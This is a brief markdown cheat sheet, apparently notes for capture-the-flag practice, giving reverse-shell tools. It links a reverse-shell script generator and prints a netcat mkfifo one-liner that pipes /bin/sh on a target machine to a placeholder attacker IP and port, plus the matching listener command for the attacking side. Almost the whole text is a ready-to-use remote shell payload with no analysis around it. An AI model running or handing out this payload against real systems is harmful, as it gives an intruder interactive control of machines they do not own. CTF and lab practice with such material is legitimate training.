# Reverse Shell Tools and Scripts for CTFs

- [Reverse Shell Scripts Generator](https://github.com/t0thkr1s/revshellgen?tab=readme-ov-file)

### Netcat reverse shell

**On taget machine**
```
# on target machine
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f
```
**On Attacking machine**
```
netcat -vlp <port>
```

